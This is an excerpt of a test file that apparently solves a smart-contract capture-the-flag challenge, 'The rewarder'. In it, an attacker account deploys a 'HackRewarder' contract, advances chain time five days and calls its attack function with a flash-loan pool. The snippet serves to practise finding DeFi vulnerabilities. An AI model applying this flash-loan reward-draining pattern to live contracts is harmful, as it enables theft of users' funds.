...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        const HackRewarderFactory = await ethers.getContractFactory('HackRewarder',attacker);
        const hackRewarder = await HackRewarderFactory.deploy(this.rewarderPool.address, this.liquidityToken.address, attacker.address, this.rewardToken.address);
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
        await hackRewarder.attack(this.flashLoanPool.address);
    });
